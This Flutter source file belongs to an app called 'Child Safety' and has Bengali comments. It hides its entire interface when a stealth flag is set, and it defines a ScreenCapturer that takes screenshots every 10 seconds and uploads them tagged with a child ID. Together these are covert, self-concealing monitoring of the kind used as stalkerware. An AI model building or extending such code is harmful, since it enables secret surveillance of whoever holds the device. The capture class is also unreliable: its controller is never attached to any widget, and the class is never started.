import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:child_app/utils/stealth_handler.dart';
import 'package:child_app/screens/home_screen.dart';
import 'dart:async';
import 'dart:typed_data';
import 'package:screenshot/screenshot.dart';
import 'package:child_app/services/screen_stream_service.dart'; // নতুন যোগ

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  
  final isStealthActive = await StealthHandler.isStealthActive();
  
  runApp(MyApp(
    showUI: !isStealthActive,
  ));
}

class MyApp extends StatelessWidget {
  final bool showUI;
  
  const MyApp({super.key, required this.showUI});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Child Safety',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: showUI ? const HomeScreen() : Container(),
      debugShowCheckedModeBanner: false,
    );
  }
}

// নতুন কোড: স্ক্রিন ক্যাপচারিং সার্ভিস
class ScreenCapturer {
  final ScreenshotController controller = ScreenshotController();
  Timer? _timer;
  final String childId;

  ScreenCapturer({required this.childId});

  void startCapturing() {
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) async {
      final frame = await captureFrame();
      if (frame != null) {
        await ScreenStreamService.uploadFrame(frame, childId);
      }
    });
  }

  Future<Uint8List?> captureFrame() async {
    try {
      return await controller.capture(
        delay: const Duration(milliseconds: 100),
        pixelRatio: 0.5, // কম রেজ্যুলেশন
        quality: 70, // JPEG কোয়ালিটি
      );
    } catch (e) {
      print('Capture error: $e');
      return null;
    }
  }

  void stopCapturing() {
    _timer?.cancel();
  }
}